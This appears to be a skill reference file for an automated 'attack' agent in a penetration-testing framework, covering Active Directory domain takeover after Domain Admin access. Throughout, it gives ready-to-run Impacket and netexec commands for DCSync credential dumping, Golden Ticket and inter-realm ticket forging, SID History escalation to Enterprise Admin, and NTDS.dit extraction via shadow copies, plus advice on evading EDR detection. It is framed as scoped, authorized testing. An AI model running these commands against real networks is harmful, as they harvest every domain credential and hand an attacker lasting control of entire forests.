---
name: domain-dominance
version: 1.0.0
description: Domain dominance techniques for Phase 5 — DCSync, Golden Ticket, DA validation, forest enumeration, forest escalation (SID History, inter-realm trusts), Enterprise Admin, NTDS.dit extraction, and POC evidence collection
phase: 5
agent: attack
mitre: T1003.006, T1558.001, T1207, T1484, T1134.005, T1003.003
ocd_branch: "Domain Admin -> Forest"
---

# Domain Dominance — Phase 5 Reference

## Decision Tree

```
START (Domain Admin credentials or equivalent privileges obtained)
  |
  v
1. DCSync (secretsdump -just-dc)
  |  Dump krbtgt hash + ALL DA/EA hashes
  |  If DCSync is blocked (network filtering, privilege issue):
  |    --> Fallback: NTDS.dit extraction via shadow copy
  |
  v
2. Golden Ticket (ticketer.py with krbtgt hash)
  |  Generate persistent access ticket
  |  Validate: access DC C$, ADMIN$, SYSVOL
  |
  v
3. DA Validation
  |  Prove full domain control:
  |  - Access DC admin shares
  |  - Create/delete test objects
  |  - Read domain secrets
  |
  v
4. Forest Enumeration
  |  Map trust relationships:
  |  - Parent/child trusts
  |  - Cross-forest trusts
  |  - Trust direction and transitivity
  |
  v
5. Forest Escalation (if multi-domain)
  |  +---> SID History Injection
  |  +---> Inter-Realm Trust Tickets (Golden Ticket with SID filtering bypass)
  |  +---> Enterprise Admin escalation
  |
  v
6. POC Evidence Collection
   Screenshots, hash dumps, DA session proof
   Save to loot/da-proof/
```

## 1. DCSync Attack (T1003.006)

Simulate a Domain Controller replication request to extract password hashes
for any or all domain accounts. Requires Replicating Directory Changes +
Replicating Directory Changes All rights (DA has these by default).

```bash
# Full DCSync — dump ALL domain hashes (krbtgt, DA, EA, all users)
secretsdump.py $DOMAIN/$DA_USER:$PASS@$DC -just-dc \
  | tee -a loot/phase5/dcsync_full_$DC.out

# Target specific accounts (stealthier — fewer replication requests)
secretsdump.py $DOMAIN/$DA_USER:$PASS@$DC \
  -just-dc-user krbtgt | tee -a loot/phase5/dcsync_krbtgt_$DC.out

secretsdump.py $DOMAIN/$DA_USER:$PASS@$DC \
  -just-dc-user Administrator | tee -a loot/phase5/dcsync_admin_$DC.out

# DCSync with hash authentication
secretsdump.py $DOMAIN/$DA_USER@$DC -hashes :$NTHASH \
  -just-dc | tee -a loot/phase5/dcsync_full_$DC.out

# DCSync with Kerberos ticket
export KRB5CCNAME=$DA_USER.ccache
secretsdump.py $DOMAIN/$DA_USER@$DC -k -no-pass \
  -just-dc | tee -a loot/phase5/dcsync_full_$DC.out
```

**Critical hashes to extract:**
- `krbtgt` — needed for Golden Ticket generation
- `Administrator` — built-in domain admin
- All accounts in Domain Admins, Enterprise Admins, Schema Admins groups
- Service accounts with high privileges (identified in Phase 3)

**Save extracted hashes to:** `loot/credentials/hashes/dcsync_$DOMAIN.txt`

## 2. Golden Ticket (T1558.001)

Forge a Kerberos TGT for any user (typically Administrator) using the krbtgt
NTLM hash. This ticket is valid for the Kerberos ticket lifetime (default 10
hours, but Golden Tickets can be forged with arbitrary lifetimes).

```bash
# Generate Golden Ticket
# Requires: krbtgt NTLM hash, domain SID, domain FQDN
ticketer.py -nthash $KRBTGT_HASH \
  -domain-sid $DOMAIN_SID \
  -domain $DOMAIN \
  Administrator | tee -a loot/phase5/golden_ticket_gen.out

# Set the ticket
export KRB5CCNAME=Administrator.ccache

# Validate Golden Ticket — access DC
wmiexec.py $DOMAIN/Administrator@$DC -k -no-pass \
  | tee -a loot/phase5/golden_ticket_validate_$DC.out

secretsdump.py $DOMAIN/Administrator@$DC -k -no-pass \
  -just-dc-user krbtgt | tee -a loot/phase5/golden_ticket_dcsync.out
```

**Getting the Domain SID:**
```bash
# From previous LDAP/BloodHound enum:
rpcclient -U "$DOMAIN\\$USER%$PASS" $DC -c "lsaquery" \
  | tee -a loot/phase5/domain_sid.out

# From secretsdump output (SID appears in the header)
# Or from ldapdomaindump output
```

**Golden Ticket considerations:**
- Golden Tickets survive password resets (except krbtgt reset)
- krbtgt must be reset TWICE to invalidate all Golden Tickets
- Ticket lifetime can be set to 10 years (forged, not bound by policy)
- Use for persistent access verification, not for maintaining backdoors in client network

## 3. DA Validation (Proof of Compromise)

Demonstrate irrefutable Domain Admin access. This evidence goes into the report.

```bash
# Access DC admin shares
netexec smb $DC -u Administrator -H $ADMIN_HASH --shares \
  | tee -a loot/phase5/da_validation_shares_$DC.out

# Access C$ share
smbclient //$DC/C$ -U "$DOMAIN\\Administrator%$PASS" \
  -c "ls" | tee -a loot/phase5/da_validation_c_share_$DC.out

# Access ADMIN$ share
smbclient //$DC/ADMIN$ -U "$DOMAIN\\Administrator%$PASS" \
  -c "ls" | tee -a loot/phase5/da_validation_admin_share_$DC.out

# Verify whoami on DC
wmiexec.py $DOMAIN/Administrator:$PASS@$DC \
  -c "whoami /all" | tee -a loot/phase5/da_validation_whoami_$DC.out

# Enumerate DA group membership (proof the account is DA)
netexec smb $DC -u Administrator -H $ADMIN_HASH \
  -x "net group \"Domain Admins\" /domain" \
  | tee -a loot/phase5/da_validation_group_$DC.out

# Read domain password policy (DA-level proof)
netexec smb $DC -u Administrator -H $ADMIN_HASH --pass-pol \
  | tee -a loot/phase5/da_validation_passpol_$DC.out
```

**Save all validation output to:** `loot/da-proof/`

## 4. Forest Enumeration

Map the Active Directory forest structure — trust relationships, child domains,
and potential cross-forest escalation paths.

```bash
# Enumerate domain trusts
netexec smb $DC -u $DA_USER -H $HASH -M enum_trusts \
  | tee -a loot/phase5/forest_trusts_$DC.out

# LDAP trust enumeration
ldapsearch -H ldap://$DC -D "$DA_USER@$DOMAIN" -w "$PASS" \
  -b "CN=System,$BASE_DN" "(objectClass=trustedDomain)" \
  trustPartner trustDirection trustType \
  | tee -a loot/phase5/ldap_trusts_$DC.out

# Impacket trust enumeration
rpcclient -U "$DOMAIN\\$DA_USER%$PASS" $DC \
  -c "enumtrust" | tee -a loot/phase5/rpc_trusts_$DC.out

# Check for additional DCs in trusted domains
nmap -sV -p 88,389,636,445,3268,3269 $TRUSTED_DOMAIN_DC \
  | tee -a loot/phase5/nmap_trusted_dc.out
```

**Trust types to identify:**
| Trust Type | Direction | Escalation Potential |
|-----------|-----------|---------------------|
| Parent-Child | Bidirectional | HIGH — SID History / trust key |
| Tree-Root | Bidirectional | HIGH — inter-realm trust ticket |
| External | Unidirectional/Bi | MEDIUM — if SID filtering disabled |
| Forest | Unidirectional/Bi | LOW — SID filtering usually enabled |
| Shortcut | Bidirectional | MEDIUM — same forest |

## 5. Forest Escalation

### SID History Injection (T1134.005)

Inject Enterprise Admin SID into a Golden Ticket to escalate from child domain
DA to forest-wide Enterprise Admin. Works across parent-child trusts.

```bash
# Get Enterprise Admins SID (parent domain SID + -519)
# Parent domain SID: S-1-5-21-<parent-domain-RID>
# Enterprise Admins RID: 519

# Golden Ticket with SID History (ExtraSids)
ticketer.py -nthash $KRBTGT_HASH \
  -domain-sid $CHILD_DOMAIN_SID \
  -domain $CHILD_DOMAIN \
  -extra-sid $PARENT_DOMAIN_SID-519 \
  Administrator | tee -a loot/phase5/sid_history_ticket.out

# Set the ticket and access parent DC
export KRB5CCNAME=Administrator.ccache
wmiexec.py $PARENT_DOMAIN/Administrator@$PARENT_DC -k -no-pass \
  | tee -a loot/phase5/forest_escalation_$PARENT_DC.out
```

### Inter-Realm Trust Tickets

Forge inter-realm TGT using the trust key (extracted via DCSync from
`TRUST_DOMAIN$` account or from the trustAuthIncoming attribute).

```bash
# Extract trust key via DCSync
secretsdump.py $DOMAIN/$DA_USER:$PASS@$DC \
  -just-dc-user "$TRUSTED_DOMAIN\$" \
  | tee -a loot/phase5/trust_key_extraction.out

# Forge inter-realm ticket
ticketer.py -nthash $TRUST_KEY_HASH \
  -domain-sid $DOMAIN_SID \
  -domain $DOMAIN \
  -spn krbtgt/$TRUSTED_DOMAIN \
  -extra-sid $TRUSTED_DOMAIN_SID-519 \
  Administrator | tee -a loot/phase5/interrealm_ticket.out
```

### Enterprise Admin Escalation

In a multi-domain forest, EA grants full control over all domains.

```bash
# Validate EA access on forest root DC
export KRB5CCNAME=Administrator.ccache
secretsdump.py $ROOT_DOMAIN/Administrator@$ROOT_DC -k -no-pass \
  -just-dc | tee -a loot/phase5/ea_dcsync_$ROOT_DC.out

# Prove EA on each child domain DC
secretsdump.py $CHILD_DOMAIN/Administrator@$CHILD_DC -k -no-pass \
  -just-dc-user krbtgt | tee -a loot/phase5/ea_child_$CHILD_DC.out
```

## 6. NTDS.dit Extraction (Fallback — T1003.003)

If DCSync is blocked (network ACL, insufficient privileges), extract NTDS.dit
directly from the DC filesystem via Volume Shadow Copy.

```bash
# Create shadow copy on DC (requires admin on DC)
wmiexec.py $DOMAIN/Administrator:$PASS@$DC \
  -c "vssadmin create shadow /for=C:" \
  | tee -a loot/phase5/vss_create_$DC.out

# Copy NTDS.dit and SYSTEM hive from shadow
wmiexec.py $DOMAIN/Administrator:$PASS@$DC \
  -c "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\NTDS\\ntds.dit C:\\Windows\\Temp\\ntds.dit" \
  | tee -a loot/phase5/ntds_copy_$DC.out

wmiexec.py $DOMAIN/Administrator:$PASS@$DC \
  -c "copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM C:\\Windows\\Temp\\SYSTEM" \
  | tee -a loot/phase5/system_copy_$DC.out

# Download files
smbclient //$DC/C$ -U "$DOMAIN\\Administrator%$PASS" \
  -c "get Windows\\Temp\\ntds.dit loot/phase5/ntds.dit; get Windows\\Temp\\SYSTEM loot/phase5/SYSTEM"

# Extract hashes offline
secretsdump.py -ntds loot/phase5/ntds.dit -system loot/phase5/SYSTEM LOCAL \
  | tee -a loot/phase5/ntds_offline_$DC.out

# Cleanup (remove temp files from DC)
wmiexec.py $DOMAIN/Administrator:$PASS@$DC \
  -c "del C:\\Windows\\Temp\\ntds.dit C:\\Windows\\Temp\\SYSTEM"
```

## 7. POC Evidence Collection

Compile irrefutable proof of domain compromise for the report.

**Evidence checklist:**
- [ ] `whoami /all` on DC as DA — saved to `loot/da-proof/`
- [ ] DC admin share access (C$, ADMIN$) — saved to `loot/da-proof/`
- [ ] `net group "Domain Admins" /domain` — saved to `loot/da-proof/`
- [ ] krbtgt hash extracted — saved to `loot/credentials/hashes/`
- [ ] Full DCSync output — saved to `loot/phase5/`
- [ ] Golden Ticket generation + validation — saved to `loot/phase5/`
- [ ] Forest trust map (if multi-domain) — saved to `loot/phase5/`
- [ ] EA validation (if forest escalated) — saved to `loot/da-proof/`

**Screenshot methodology:**
If visual evidence is needed (e.g., desktop access, GUI admin tools),
use `gowitness` or similar to capture web-based admin panels, or pipe
command output as the primary POC. Command output is preferred over
screenshots for auditability.

## Operational Notes

- DCSync generates replication traffic detectable by EDR — use targeted extraction
  (specific accounts) before full dump if stealth matters
- Golden Tickets bypass all password-based controls — validate carefully, then document
- Forest escalation via SID History only works if SID Filtering is NOT enabled on the trust
- Always clean up temporary files (NTDS.dit copies) from DC after extraction
- Save ALL evidence to both `loot/phase5/` (raw output) and `loot/da-proof/` (curated POC)
- Context headers BEFORE every tee command (mandatory)
- Validate targets against scope CIDRs before ANY cross-domain operations
